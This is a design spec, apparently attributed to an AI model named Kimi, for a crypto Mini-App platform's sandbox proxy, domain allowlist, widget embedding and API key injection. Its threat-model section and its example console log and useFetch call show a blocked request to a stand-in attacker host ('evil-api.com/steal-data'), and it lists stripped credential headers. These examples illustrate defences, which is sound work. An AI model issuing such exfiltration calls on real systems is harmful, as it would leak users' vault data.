# KIMI — External Connectivity & Sandbox IO Specification

**Model:** Kimi (The Integrator)  
**Phase:** 2 — Deep Dive Implementation Spec  
**Domain:** Proxy Gate, Domain Allowlist, External Widget Integration  

---

## 1. The Proxy Gate: `useFetch()` Hook

### 1.1 Why a Proxy?

Mini-Apps run inside a sandboxed iframe with a restrictive Content Security Policy. Direct `fetch()` calls to external APIs are blocked for two reasons:

1. **CORS:** Most APIs (Jupiter, Raydium, CoinGecko) don't include `null` in their `Access-Control-Allow-Origin` header. The iframe's origin is `null` (srcdoc without `allow-same-origin`), so every cross-origin request fails.

2. **Security:** An unrestricted `fetch()` lets a malicious Mini-App exfiltrate vault data to `evil-site.com`. The proxy enforces a domain allowlist and logs all outbound requests.

**Solution:** All external HTTP requests route through `/api/proxy` on the Keystone Next.js server. The Mini-App uses a `useFetch()` hook from `@keystone-os/sdk` which transparently proxies requests.

### 1.2 SDK Hook: `useFetch()`

```typescript
// Virtual SDK module — inside the iframe runtime

export function useFetch<T = unknown>(
  url: string,
  options: FetchOptions = {}
): FetchResult<T> {
  const [data, setData] = useState<T | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState<boolean>(true);

  const fetchData = useCallback(async () => {
    setLoading(true);
    setError(null);

    try {
      // Route through parent via postMessage bridge
      const result = await new Promise<T>((resolve, reject) => {
        const requestId = crypto.randomUUID();

        const handler = (event: MessageEvent) => {
          if (event.data?.type !== 'PROXY_RESPONSE') return;
          if (event.data?.requestId !== requestId) return;
          window.removeEventListener('message', handler);

          if (event.data.error) {
            reject(new Error(event.data.error));
          } else {
            resolve(event.data.data as T);
          }
        };

        window.addEventListener('message', handler);

        // Send proxy request to parent
        window.parent.postMessage({
          type: 'PROXY_REQUEST',
          requestId,
          url,
          method: options.method || 'GET',
          headers: options.headers || {},
          body: options.body ? JSON.stringify(options.body) : undefined,
        }, '*');

        // Timeout after 30 seconds
        setTimeout(() => {
          window.removeEventListener('message', handler);
          reject(new Error('Proxy request timed out (30s)'));
        }, 30000);
      });

      setData(result);
    } catch (err: any) {
      setError(err.message);
      console.error(`[useFetch] ${url}: ${err.message}`);
    } finally {
      setLoading(false);
    }
  }, [url, options.method, options.body]);

  useEffect(() => {
    fetchData();
  }, [fetchData]);

  return { data, error, loading, refetch: fetchData };
}
```

**Note on `window.parent.postMessage`:** Yes, this pattern normally triggers the static security scanner's `NO_DIRECT_BRIDGE` rule. However, the `useFetch()` hook is part of the **virtual SDK module** — code that Keystone injects into the iframe, not user-written code. The security scanner only scans user files, not the SDK runtime. This is by design: the SDK is trusted; user code is not.

### 1.3 Host-Side Proxy Handler

The parent window (Studio page) listens for `PROXY_REQUEST` messages and forwards them to the Next.js API route:

```typescript
// In LivePreview.tsx — add to handleMessage()

if (type === 'PROXY_REQUEST') {
  const { requestId, url, method, headers, body } = event.data;

  try {
    const proxyResponse = await fetch('/api/proxy', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        url,
        method,
        headers,
        body,
        appId: currentAppId,  // For allowlist validation
      }),
    });

    const result = await proxyResponse.json();

    if (!proxyResponse.ok) {
      iframeRef.current?.contentWindow?.postMessage({
        type: 'PROXY_RESPONSE',
        requestId,
        error: result.error || `Proxy returned ${proxyResponse.status}`,
      }, '*');
    } else {
      iframeRef.current?.contentWindow?.postMessage({
        type: 'PROXY_RESPONSE',
        requestId,
        data: result.data,
      }, '*');
    }

    setLogs(prev => [...prev.slice(-500),
      `[info] [Proxy] ${method} ${url} → ${proxyResponse.status}`
    ]);
  } catch (err: any) {
    iframeRef.current?.contentWindow?.postMessage({
      type: 'PROXY_RESPONSE',
      requestId,
      error: err.message,
    }, '*');

    setLogs(prev => [...prev.slice(-500),
      `[error] [Proxy] ${method} ${url} → ${err.message}`
    ]);
  }
}
```

### 1.4 Next.js API Route: `/api/proxy`

```typescript
// src/app/api/proxy/route.ts

import { NextRequest, NextResponse } from 'next/server';
import { marketplace } from '@/lib/studio/marketplace';

// ─── Global Allowlist (always available) ────────────────────
const GLOBAL_ALLOWLIST = new Set([
  // Jupiter (Swap aggregator)
  'api.jup.ag',
  'quote-api.jup.ag',
  'price.jup.ag',
  'token.jup.ag',

  // Raydium
  'api.raydium.io',
  'api-v3.raydium.io',

  // Birdeye (Token analytics)
  'public-api.birdeye.so',

  // Helius (RPC + DAS)
  'api.helius.xyz',
  'rpc.helius.xyz',

  // CoinGecko (Price data)
  'api.coingecko.com',
  'pro-api.coingecko.com',

  // DexScreener
  'api.dexscreener.com',

  // Solana public RPCs (read-only)
  'api.mainnet-beta.solana.com',
  'api.devnet.solana.com',

  // RugCheck
  'api.rugcheck.xyz',

  // Realms / Governance
  'app.realms.today',
]);

// ─── Rate Limiting ──────────────────────────────────────────
const rateLimiter = new Map<string, { count: number; resetAt: number }>();
const RATE_LIMIT = 60;       // requests per window
const RATE_WINDOW = 60_000;  // 1 minute window

function checkRateLimit(appId: string): boolean {
  const now = Date.now();
  const entry = rateLimiter.get(appId);

  if (!entry || now > entry.resetAt) {
    rateLimiter.set(appId, { count: 1, resetAt: now + RATE_WINDOW });
    return true;
  }

  if (entry.count >= RATE_LIMIT) return false;
  entry.count++;
  return true;
}

// ─── Request Size Limits ────────────────────────────────────
const MAX_REQUEST_BODY = 1024 * 100;   // 100KB max request body
const MAX_RESPONSE_BODY = 1024 * 1024; // 1MB max response body

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const { url, method, headers, body: requestBody, appId } = body;

    // ─── Validation ─────────────────────────────────────

    // 1. URL must be valid
    let parsedUrl: URL;
    try {
      parsedUrl = new URL(url);
    } catch {
      return NextResponse.json({ error: 'Invalid URL' }, { status: 400 });
    }

    // 2. Must be HTTPS (no HTTP, no other protocols)
    if (parsedUrl.protocol !== 'https:') {
      return NextResponse.json(
        { error: 'Only HTTPS URLs are allowed' },
        { status: 400 }
      );
    }

    // 3. Domain must be in allowlist
    const domain = parsedUrl.hostname;
    let allowed = GLOBAL_ALLOWLIST.has(domain);

    // Check app-specific manifest allowlist
    if (!allowed && appId) {
      const app = await marketplace.getAppById(appId);
      if (app?.manifest) {
        const manifest = typeof app.manifest === 'string'
          ? JSON.parse(app.manifest)
          : app.manifest;
        allowed = (manifest.allowedDomains || []).includes(domain);
      }
    }

    if (!allowed) {
      return NextResponse.json(
        { error: `Domain "${domain}" is not in the allowlist. Add it to your keystone.manifest.json allowedDomains.` },
        { status: 403 }
      );
    }

    // 4. Rate limit per app
    if (appId && !checkRateLimit(appId)) {
      return NextResponse.json(
        { error: 'Rate limit exceeded (60 requests/minute). Please slow down.' },
        { status: 429 }
      );
    }

    // 5. Method whitelist
    const allowedMethods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'];
    if (!allowedMethods.includes((method || 'GET').toUpperCase())) {
      return NextResponse.json(
        { error: `HTTP method "${method}" is not allowed` },
        { status: 400 }
      );
    }

    // 6. Request body size limit
    if (requestBody && JSON.stringify(requestBody).length > MAX_REQUEST_BODY) {
      return NextResponse.json(
        { error: 'Request body exceeds 100KB limit' },
        { status: 413 }
      );
    }

    // ─── Proxy the Request ──────────────────────────────

    // Sanitize headers — strip sensitive ones
    const sanitizedHeaders: Record<string, string> = {};
    const blockedHeaders = ['cookie', 'authorization', 'x-api-key', 'host', 'origin', 'referer'];
    for (const [key, value] of Object.entries(headers || {})) {
      if (!blockedHeaders.includes(key.toLowerCase())) {
        sanitizedHeaders[key] = value as string;
      }
    }

    // Add proxy identification
    sanitizedHeaders['User-Agent'] = 'Keystone-Proxy/1.0';
    sanitizedHeaders['X-Forwarded-By'] = 'keystone-studio';

    const fetchOptions: RequestInit = {
      method: (method || 'GET').toUpperCase(),
      headers: sanitizedHeaders,
      signal: AbortSignal.timeout(15000), // 15s timeout
    };

    if (requestBody && fetchOptions.method !== 'GET') {
      fetchOptions.body = typeof requestBody === 'string'
        ? requestBody
        : JSON.stringify(requestBody);
      sanitizedHeaders['Content-Type'] = sanitizedHeaders['Content-Type'] || 'application/json';
    }

    const response = await fetch(url, fetchOptions);

    // ─── Process Response ───────────────────────────────

    const contentType = response.headers.get('content-type') || '';
    let responseData: unknown;

    if (contentType.includes('application/json')) {
      const text = await response.text();
      if (text.length > MAX_RESPONSE_BODY) {
        return NextResponse.json(
          { error: 'Response exceeds 1MB limit' },
          { status: 502 }
        );
      }
      responseData = JSON.parse(text);
    } else {
      // Non-JSON responses: return as text
      const text = await response.text();
      if (text.length > MAX_RESPONSE_BODY) {
        return NextResponse.json(
          { error: 'Response exceeds 1MB limit' },
          { status: 502 }
        );
      }
      responseData = text;
    }

    return NextResponse.json({
      data: responseData,
      status: response.status,
      headers: Object.fromEntries(response.headers.entries()),
    });

  } catch (err: any) {
    if (err.name === 'AbortError' || err.name === 'TimeoutError') {
      return NextResponse.json(
        { error: 'Upstream request timed out (15s)' },
        { status: 504 }
      );
    }
    return NextResponse.json(
      { error: `Proxy error: ${err.message}` },
      { status: 502 }
    );
  }
}
```

---

## 2. Allowlist Logic

### 2.1 Two-Tier Allowlist Architecture

```
┌─────────────────────────────────────────────────────────┐
│                   ALLOWLIST RESOLUTION                    │
│                                                         │
│  Tier 1: GLOBAL ALLOWLIST (hardcoded in proxy route)    │
│  ──────────────────────────────────────────────────      │
│  Domains available to ALL Mini-Apps by default.          │
│  Curated by Keystone team. Includes:                     │
│  - Jupiter, Raydium, Birdeye, Helius, CoinGecko,        │
│    DexScreener, RugCheck, Solana RPCs                    │
│                                                         │
│  Tier 2: APP MANIFEST ALLOWLIST (per-app)               │
│  ──────────────────────────────────────────              │
│  Additional domains declared in keystone.manifest.json   │
│  "allowedDomains": ["custom-api.example.com"]            │
│  Validated during Security Scan (OPUS spec §3).          │
│                                                         │
│  Resolution: request.domain ∈ (Global ∪ Manifest)       │
│  If not in either → 403 Forbidden                       │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### 2.2 Preventing Data Exfiltration

**Threat:** A malicious app could try to send vault data to an attacker's server.

**Defenses (layered):**

| Layer | Mechanism | What It Catches |
|-------|-----------|-----------------|
| **1. CSP in iframe** | `connect-src https://esm.sh blob:` | Blocks ANY direct network request from the iframe |
| **2. Bridge gating** | `PROXY_REQUEST` requires host to forward | All requests must pass through the host's handler |
| **3. Domain allowlist** | Only global + manifest domains pass | `evil-site.com` is not on any allowlist |
| **4. Security scan** | Manifest validation checks `allowedDomains` vs code usage | Publishing an app with `evil-site.com` in manifest gets flagged |
| **5. Header sanitization** | Strips `Cookie`, `Authorization`, `X-API-Key` | Prevents credential forwarding even to allowed domains |
| **6. Rate limiting** | 60 req/min per app | Limits bulk exfiltration throughput |
| **7. Response size cap** | 1MB max response | Prevents the proxy from being used as a data pipe |

### 2.3 Adding Custom Domains

Developers declare custom domains in their `keystone.manifest.json`:

```jsonc
{
  "allowedDomains": [
    "my-custom-api.vercel.app",
    "data.myproject.io"
  ]
}
```

During the Security Scan (OPUS spec Stage 3), the scanner validates:
1. Each declared domain is actually used in the code (no orphan declarations).
2. The domain is HTTPS (no HTTP allowed).
3. The domain is not a known malicious domain (checked against a blocklist).
4. The domain is not a catch-all wildcard (no `*.example.com`).

### 2.4 Developer Experience: Clear Error Messages

When a domain is blocked, the Studio Console shows:

```
[error] [Proxy] GET https://evil-api.com/steal-data → 403 Forbidden
[info]  Domain "evil-api.com" is not in the allowlist.
[hint]  Add it to your keystone.manifest.json "allowedDomains" array,
        then re-publish. The Security Scan will validate it.
```

The `useFetch()` hook returns this as `error`:
```typescript
const { data, error } = useFetch('https://evil-api.com/steal-data');
// error === 'Domain "evil-api.com" is not in the allowlist...'
```

---

## 3. External Widget Integration

### 3.1 The Challenge

Mini-Apps may need to embed third-party widgets:
- **TradingView charts** (lightweight-charts or TradingView widget)
- **Jupiter Terminal** (swap widget)
- **Phantom Connect** button (for external wallet connections)

These widgets often load external scripts, create their own iframes, or require DOM access patterns that conflict with our sandbox.

### 3.2 Strategy: Three Tiers of Widget Integration

| Tier | Widget Type | Integration Method | Example |
|------|------------|-------------------|---------|
| **Tier 1: NPM Package** | Pure JS/React libraries available on npm | Import via esm.sh import map. No special handling. | `lightweight-charts`, `recharts`, `d3`, `chart.js` |
| **Tier 2: Keystone Wrapper** | Widgets that need network access | Build a React wrapper component in the SDK that uses `useFetch()` internally | Jupiter quotes, Birdeye charts |
| **Tier 3: Nested Iframe** | Widgets that must load external scripts | Embed as a nested iframe with strict CSP, communicate via postMessage | TradingView advanced widget |

### 3.3 Tier 1: NPM Package Widgets (Recommended)

The simplest and most secure approach. Works with any React-compatible library.

```typescript
// User code in App.tsx
import React, { useEffect, useRef } from 'react';
import { createChart } from 'lightweight-charts';
import { useVault } from '@keystone-os/sdk';

export default function App() {
  const chartRef = useRef<HTMLDivElement>(null);
  const { tokens } = useVault();

  useEffect(() => {
    if (!chartRef.current) return;

    const chart = createChart(chartRef.current, {
      width: chartRef.current.clientWidth,
      height: 300,
      layout: { background: { color: '#04060b' }, textColor: '#e2e8f0' },
      grid: { vertLines: { color: '#1e293b' }, horzLines: { color: '#1e293b' } },
    });

    const series = chart.addAreaSeries({
      lineColor: '#36e27b',
      topColor: 'rgba(54, 226, 123, 0.2)',
      bottomColor: 'rgba(54, 226, 123, 0)',
    });

    // Set data from vault
    series.setData(/* price history data */);

    return () => chart.remove();
  }, [tokens]);

  return <div ref={chartRef} className="w-full" />;
}
```

**Lockfile entry:**
```json
{
  "lightweight-charts": {
    "version": "4.2.1",
    "url": "https://esm.sh/lightweight-charts@4.2.1",
    "external": []
  }
}
```

No React externalization needed — `lightweight-charts` doesn't depend on React.

### 3.4 Tier 2: Keystone SDK Wrapper Components

For services that require authenticated API calls (e.g., Jupiter swap execution), we provide pre-built SDK components that handle proxy routing internally.

```typescript
// Part of @keystone-os/sdk — provided in the virtual module

/**
 * Jupiter Quote component — fetches swap quotes via Keystone proxy.
 * The developer doesn't need to know about useFetch or proxy routing.
 */
export function JupiterQuote({
  inputMint,
  outputMint,
  amount,
  slippageBps = 50,
  onQuote,
  children,
}: {
  inputMint: string;
  outputMint: string;
  amount: number;
  slippageBps?: number;
  onQuote?: (quote: JupiterQuoteResponse) => void;
  children?: (props: { quote: JupiterQuoteResponse | null; loading: boolean; error: string | null }) => React.ReactNode;
}) {
  const { data, loading, error, refetch } = useFetch<JupiterQuoteResponse>(
    `https://quote-api.jup.ag/v6/quote?inputMint=${inputMint}&outputMint=${outputMint}&amount=${amount}&slippageBps=${slippageBps}`
  );

  useEffect(() => {
    if (data && onQuote) onQuote(data);
  }, [data]);

  if (children) {
    return <>{children({ quote: data, loading, error })}</>;
  }

  // Default render
  if (loading) return <div className="animate-pulse bg-zinc-800 h-12 rounded-lg" />;
  if (error) return <div className="text-red-400 text-sm">{error}</div>;
  if (!data) return null;

  return (
    <div className="bg-zinc-900/50 border border-zinc-800 rounded-lg p-4">
      <div className="flex justify-between text-sm">
        <span className="text-zinc-400">Output Amount</span>
        <span className="font-mono text-white">
          {(Number(data.outAmount) / 10 ** 6).toFixed(2)}
        </span>
      </div>
      <div className="flex justify-between text-xs mt-2">
        <span className="text-zinc-500">Price Impact</span>
        <span className={`font-mono ${Number(data.priceImpactPct) > 1 ? 'text-red-400' : 'text-emerald-400'}`}>
          {data.priceImpactPct}%
        </span>
      </div>
    </div>
  );
}

interface JupiterQuoteResponse {
  inputMint: string;
  inAmount: string;
  outputMint: string;
  outAmount: string;
  otherAmountThreshold: string;
  swapMode: string;
  slippageBps: number;
  priceImpactPct: string;
  routePlan: Array<{
    swapInfo: { ammKey: string; label: string; inputMint: string; outputMint: string };
    percent: number;
  }>;
}
```

**Usage in user code:**
```typescript
import { JupiterQuote, useVault, useTurnkey } from '@keystone-os/sdk';

export default function App() {
  const { tokens } = useVault();
  const { signTransaction } = useTurnkey();

  return (
    <JupiterQuote
      inputMint="So11111111111111111111111111111111111111112"
      outputMint="EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"
      amount={1_000_000_000} // 1 SOL in lamports
    >
      {({ quote, loading, error }) => (
        <div>
          {loading && <span>Getting best price...</span>}
          {quote && (
            <button onClick={() => {
              // Use quote data to build and sign the swap transaction
              signTransaction(
                { data: JSON.stringify(quote), metadata: { type: 'jupiter_swap' } },
                `Swap 1 SOL for ~${(Number(quote.outAmount) / 1e6).toFixed(2)} USDC`
              );
            }}>
              Swap Now
            </button>
          )}
        </div>
      )}
    </JupiterQuote>
  );
}
```

### 3.5 Tier 3: Nested Iframe Widgets (Advanced)

For widgets that absolutely must load external scripts (e.g., TradingView's full-featured charting widget), we use a nested iframe with its own strict CSP.

```typescript
// Part of @keystone-os/sdk

/**
 * ExternalWidget — embeds a third-party widget in a nested iframe.
 * The widget runs in its own sandbox and communicates via postMessage.
 */
export function ExternalWidget({
  src,
  width = '100%',
  height = '400px',
  allow = '',
  title,
  onMessage,
}: {
  src: string;
  width?: string | number;
  height?: string | number;
  allow?: string;
  title: string;
  onMessage?: (data: unknown) => void;
}) {
  const iframeRef = useRef<HTMLIFrameElement>(null);

  useEffect(() => {
    if (!onMessage) return;

    const handler = (event: MessageEvent) => {
      // Only accept messages from this specific iframe
      if (event.source !== iframeRef.current?.contentWindow) return;
      onMessage(event.data);
    };

    window.addEventListener('message', handler);
    return () => window.removeEventListener('message', handler);
  }, [onMessage]);

  // Validate src domain against widget allowlist
  const isAllowed = WIDGET_ALLOWLIST.has(new URL(src).hostname);
  if (!isAllowed) {
    return (
      <div className="bg-red-900/20 border border-red-500/30 rounded-lg p-4 text-sm text-red-400">
        Widget domain "{new URL(src).hostname}" is not in the widget allowlist.
      </div>
    );
  }

  return (
    <iframe
      ref={iframeRef}
      src={src}
      width={width}
      height={height}
      sandbox="allow-scripts"
      title={title}
      className="border-0 rounded-lg"
      style={{ width, height }}
    />
  );
}

// Domains allowed as widget sources
const WIDGET_ALLOWLIST = new Set([
  's.tradingview.com',
  'www.tradingview.com',
  'terminal.jup.ag',
  'birdeye.so',
]);
```

**Usage:**
```typescript
import { ExternalWidget } from '@keystone-os/sdk';

export default function App() {
  return (
    <div className="p-4">
      <h2 className="text-lg font-bold mb-4">SOL/USDC Chart</h2>
      <ExternalWidget
        src="https://s.tradingview.com/widgetembed/?symbol=SOLUSD&interval=60&theme=dark"
        height={400}
        title="TradingView SOL/USDC"
      />
    </div>
  );
}
```

### 3.6 Widget Integration Summary

```
┌─────────────────────────────────────────────────────────┐
│              WIDGET DECISION TREE                        │
│                                                         │
│  Is the widget available as an npm package?              │
│  ├─ YES → Tier 1: Import via esm.sh                    │
│  │        (lightweight-charts, recharts, d3)             │
│  │        Best DX, most secure, no extra config.         │
│  │                                                      │
│  └─ NO → Does it need authenticated API calls?          │
│     ├─ YES → Tier 2: SDK Wrapper Component             │
│     │        (JupiterQuote, BirdeyeChart)                │
│     │        Uses useFetch() proxy internally.           │
│     │                                                   │
│     └─ NO → Does it REQUIRE loading external scripts?   │
│        ├─ YES → Tier 3: Nested Iframe                  │
│        │        (TradingView advanced widget)            │
│        │        Strictest sandbox. Limited interaction.  │
│        │                                                │
│        └─ NO → Build it as a React component            │
│                using useFetch() for data.                │
└─────────────────────────────────────────────────────────┘
```

---

## 4. Advanced: API Key Management

### 4.1 The Problem

Some APIs (Helius, Birdeye Pro, CoinGecko Pro) require API keys. Mini-Apps cannot embed API keys in their source code (it's visible in the marketplace). The proxy must inject keys server-side.

### 4.2 Solution: Keystone Key Vault

```typescript
// Environment variables on the Keystone server (never exposed to client)

// In .env.local:
HELIUS_API_KEY=xxx
BIRDEYE_API_KEY=xxx
COINGECKO_PRO_KEY=xxx

// In the proxy route — inject keys based on domain
const API_KEY_INJECTION: Record<string, { header: string; envVar: string }> = {
  'api.helius.xyz':         { header: 'Authorization', envVar: 'HELIUS_API_KEY' },
  'rpc.helius.xyz':         { header: 'Authorization', envVar: 'HELIUS_API_KEY' },
  'public-api.birdeye.so':  { header: 'X-API-KEY',     envVar: 'BIRDEYE_API_KEY' },
  'pro-api.coingecko.com':  { header: 'X-Cg-Pro-Api-Key', envVar: 'COINGECKO_PRO_KEY' },
};

// Inside the proxy route, before making the upstream request:
const keyConfig = API_KEY_INJECTION[domain];
if (keyConfig) {
  const apiKey = process.env[keyConfig.envVar];
  if (apiKey) {
    sanitizedHeaders[keyConfig.header] = keyConfig.header === 'Authorization'
      ? `Bearer ${apiKey}`
      : apiKey;
  }
}
```

**The developer writes:**
```typescript
const { data } = useFetch('https://public-api.birdeye.so/defi/token_overview?address=SOL');
// The proxy automatically injects X-API-KEY header
```

**The developer never sees or handles the API key.** This is a key selling point of the Keystone platform — "bring your trading tools, we provide the infrastructure."

---

## Summary

| Component | Implementation | Key Detail |
|-----------|---------------|------------|
| **useFetch()** | SDK hook → postMessage bridge → host handler → `/api/proxy` | Transparent to developer; all requests route through proxy |
| **Domain Allowlist** | Two-tier: Global (hardcoded) + Manifest (per-app) | Global includes Jupiter, Raydium, Birdeye, Helius, CoinGecko, DexScreener |
| **Anti-Exfiltration** | 7-layer defense: CSP, bridge gating, allowlist, security scan, header sanitization, rate limiting, response cap | Unknown domains get 403 with actionable error message |
| **Widget Tier 1** | npm packages via esm.sh import map | `lightweight-charts`, `recharts`, `d3` — best DX |
| **Widget Tier 2** | SDK wrapper components with `useFetch()` | `JupiterQuote`, `BirdeyeChart` — proxy routing built-in |
| **Widget Tier 3** | Nested iframe with `sandbox="allow-scripts"` | TradingView — strictest isolation, limited interaction |
| **API Keys** | Server-side injection via domain-based config | Developer never sees keys; proxy injects `Authorization` / `X-API-KEY` headers |

---

*KIMI — Document Version 1.0*
